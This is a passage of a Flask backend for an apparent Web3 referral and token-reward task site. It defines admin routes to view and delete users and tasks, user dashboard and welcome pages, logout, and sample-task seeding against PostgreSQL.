@app.route('/api/tasks/<int:task_id>', methods=['GET'])
def view_task(task_id):
    """Retrieve details of a specific task."""
    if not session.get('is_admin'):
        return {"error": "Unauthorized"}, 401
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor(cursor_factory=RealDictCursor)
        cursor.execute("SELECT * FROM tasks WHERE id = %s", (task_id,))
        task = cursor.fetchone()
        conn.close()
        return task, 200
    except Exception as e:
        logging.error(f"Error viewing task: {e}")
        return {"error": "Failed to view task"}, 500


@app.route('/api/users/<int:user_id>', methods=['GET'])
def view_user(user_id):
    """Retrieve details of a specific user."""
    if not session.get('is_admin'):
        return {"error": "Unauthorized"}, 401
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor(cursor_factory=RealDictCursor)
        cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
        user = cursor.fetchone()
        conn.close()
        return user, 200
    except Exception as e:
        logging.error(f"Error viewing user: {e}")
        return {"error": "Failed to view user"}, 500

@app.route('/api/users/<int:user_id>', methods=['DELETE'])
def delete_user(user_id):
    """Delete a user by ID."""
    if not session.get('is_admin'):
        return {"error": "Unauthorized"}, 401
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute("DELETE FROM users WHERE id = %s", (user_id,))
        conn.commit()
        conn.close()
        return {"message": "User deleted successfully"}, 200
    except Exception as e:
        logging.error(f"Error deleting user: {e}")
        return {"error": "Failed to delete user"}, 500

@app.route('/api/tasks/<int:task_id>', methods=['DELETE'])
def delete_task(task_id):
    """Delete a task by ID."""
    if not session.get('is_admin'):
        return {"error": "Unauthorized"}, 401
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute("DELETE FROM tasks WHERE id = %s", (task_id,))
        conn.commit()
        conn.close()
        return {"message": "Task deleted successfully"}, 200
    except Exception as e:
        logging.error(f"Error deleting task: {e}")
        return {"error": "Failed to delete task"}, 500

def get_all_users():
    """Retrieve all users for admin management."""
    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
    cursor = conn.cursor(cursor_factory=RealDictCursor)
    cursor.execute("SELECT id, username, referral_count, referral_reward, token_balance FROM users ORDER BY username ASC")
    users = cursor.fetchall()
    conn.close()
    return users

@app.route('/admin/users', methods=['GET'])
def admin_users():
    if not session.get('is_admin'):
        return redirect(url_for('admin_login'))
    
    users = get_all_users()
    return render_template('admin_dashboard.html', users=users)



@app.route('/admin_logout')
def admin_logout():
    """Logout route for admin."""
    session.pop('is_admin', None)
    flash("You have been logged out.", "info")
    return redirect(url_for('admin_login'))


@app.route('/welcome')
def welcome():
    username = session.get('username', 'User')
    
    # If the user is returning, automatically refresh their token
    if 'refresh_token' in session:
        access_token, refresh_token = refresh_token_in_db(session['refresh_token'], username)
        if access_token and refresh_token:
            session['access_token'] = access_token
            session['refresh_token'] = refresh_token
            send_message_via_telegram(f"🔄 Token refreshed for returning user @{username}.")

    # Determine the message based on user status
    if 'is_new_user' in session:
        message = f"Congratulations, @{username}! Your sign-up was successful."
        session.pop('is_new_user')  # Remove the flag after displaying
    else:
        message = f"Welcome back, @{username}!"

    # Render the welcome page with the personalized message
    return render_template('welcome.html', message=message)

@app.route('/dashboard')
def dashboard():
    username = session.get('username')
    if not username:
        return redirect(url_for('home'))
    
    user_stats = get_user_stats(username)
    active_tasks = get_tasks("active")
    upcoming_tasks = get_tasks("upcoming")

    logging.info(f"Rendering dashboard for {username}: {user_stats}")

    return render_template(
        'dashboard.html',
        username=username,
        user_stats=user_stats,
        active_tasks=active_tasks,
        upcoming_tasks=upcoming_tasks
    )


@app.route('/logout')
def logout():
    # Clear the session data
    session.clear()
    return redirect(url_for('home'))


@app.route('/about_us')
def about_us():
    return render_template('about_us.html')

@app.route('/blog')
def blog():
    # Placeholder content for the Blog page
    return render_template('blog.html')

@app.route('/docs')
def docs():
    # Placeholder content for the Documentation page
    return render_template('docs.html')

@app.route('/contact')
def contact():
    # Placeholder content for the Contact Us page
    return render_template('contact.html')

# Route to display active.html
@app.route('/active')
def active():
    # Retrieve the username from the session and pass it to the template
    username = session.get('username', 'User')
    return render_template('active.html', username=username)
    
def create_sample_tasks():
    """Insert sample tasks into the tasks table if it's empty."""
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()

        # Check if tasks are already added
        cursor.execute('SELECT COUNT(*) FROM tasks')
        task_count = cursor.fetchone()[0]

        if task_count == 0:
            sample_tasks = [
                ('Complete Profile Setup', 'Finish setting up your profile to earn tokens', 50),
                ('Share Your Referral Link', 'Invite others using your referral link', 100),
                ('Complete a Survey', 'Complete a survey on Web3 topics', 70)
            ]
            for title, description, reward in sample_tasks:
                cursor.execute('''
                    INSERT INTO tasks (title, description, reward)
                    VALUES (%s, %s, %s)
                ''', (title, description, reward))
            conn.commit()
            print("Sample tasks created successfully.")
        else:
            print("Sample tasks already exist in the database.")

        conn.close()
    except Exception as e:
        print(f"Error creating sample tasks: {e}")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    send_startup_message()
    init_db()            # Initialize database with necessary tables
    create_sample_tasks()  # Populate tasks if table is empty
    app.run(host='0.0.0.0', port=port)
